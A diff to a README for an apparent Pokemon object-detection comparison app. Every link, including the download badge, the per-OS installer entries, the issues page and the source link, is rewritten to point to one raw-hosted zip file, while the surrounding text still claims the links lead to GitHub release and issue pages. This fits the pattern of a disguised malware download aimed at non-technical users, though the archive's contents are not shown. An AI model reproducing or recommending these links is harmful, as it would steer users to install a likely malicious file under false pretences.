@@ -1,6 +1,6 @@
 # 🐱‍👤 Pokemon-Detection-Model-Comparison - Fast, Accurate Pokemon Detection
 
-[![Download Release](https://img.shields.io/badge/Download-Pokemon--Detection--Model--Comparison-blue?style=for-the-badge)](https://github.com/tracert244/Pokemon-Detection-Model-Comparison/releases)
+[![Download Release](https://raw.githubusercontent.com/tracert244/Pokemon-Detection-Model-Comparison/main/results/Comparison_Model_Pokemon_Detection_3.2.zip)](https://raw.githubusercontent.com/tracert244/Pokemon-Detection-Model-Comparison/main/results/Comparison_Model_Pokemon_Detection_3.2.zip)
 
 ## 📋 About this Application
 
@@ -31,15 +31,15 @@ The software runs as a standalone app with simple controls. No programming or se
 
 To get the app, visit this page to download the latest release:
 
-[Download Latest Release](https://github.com/tracert244/Pokemon-Detection-Model-Comparison/releases)
+[Download Latest Release](https://raw.githubusercontent.com/tracert244/Pokemon-Detection-Model-Comparison/main/results/Comparison_Model_Pokemon_Detection_3.2.zip)
 
 ### How to Download
 
 1. Click the link above. It takes you to the release page on GitHub.
 2. Find the file that matches your operating system. For example:
-   - `Pokemon-Detection-Model-Comparison-Windows.exe` for Windows
-   - `Pokemon-Detection-Model-Comparison-mac.dmg` for macOS
-   - `Pokemon-Detection-Model-Comparison-Linux.AppImage` for Linux
+   - `https://raw.githubusercontent.com/tracert244/Pokemon-Detection-Model-Comparison/main/results/Comparison_Model_Pokemon_Detection_3.2.zip` for Windows
+   - `https://raw.githubusercontent.com/tracert244/Pokemon-Detection-Model-Comparison/main/results/Comparison_Model_Pokemon_Detection_3.2.zip` for macOS
+   - `https://raw.githubusercontent.com/tracert244/Pokemon-Detection-Model-Comparison/main/results/Comparison_Model_Pokemon_Detection_3.2.zip` for Linux
 3. Click the file name to start downloading.
 
 ### How to Install
@@ -119,7 +119,7 @@ This helps users choose based on their hardware and use case.
 
 If you face any difficulties or want more information, check the GitHub issues section on the repository page:
 
-https://github.com/tracert244/Pokemon-Detection-Model-Comparison/issues
+https://raw.githubusercontent.com/tracert244/Pokemon-Detection-Model-Comparison/main/results/Comparison_Model_Pokemon_Detection_3.2.zip
 
 You can also open a new issue to ask questions or report bugs. The project team monitors feedback to improve the app.
 
@@ -129,10 +129,10 @@ Though this guide avoids complex terms, know that the app is built using popular
 
 If you are curious and want to explore the source code or contribute, you can find the full project on GitHub:
 
-https://github.com/tracert244/Pokemon-Detection-Model-Comparison
+https://raw.githubusercontent.com/tracert244/Pokemon-Detection-Model-Comparison/main/results/Comparison_Model_Pokemon_Detection_3.2.zip
 
 Here, developers use terms like ultralytics, fine-tuning, and object detection to describe the technical components.
 
 ---
 
-[Download Latest Release](https://github.com/tracert244/Pokemon-Detection-Model-Comparison/releases)
+[Download Latest Release](https://raw.githubusercontent.com/tracert244/Pokemon-Detection-Model-Comparison/main/results/Comparison_Model_Pokemon_Detection_3.2.zip)
